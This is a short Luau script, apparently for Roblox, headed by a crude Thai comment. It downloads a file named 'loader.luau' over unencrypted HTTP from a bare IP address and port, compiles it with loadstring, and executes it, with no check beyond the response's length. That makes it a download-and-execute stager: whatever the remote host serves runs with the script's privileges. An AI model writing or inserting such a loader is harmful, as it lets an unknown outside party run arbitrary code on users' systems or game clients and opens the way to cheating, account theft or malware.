-- หน้าหี
local ok, body = pcall(function() return game:HttpGet("http://154.197.69.87:8090/loader.luau") end)
if ok and type(body) == "string" and #body > 64 then
    local fn = (loadstring or load)(body)
    if type(fn) == "function" then return fn() end
end
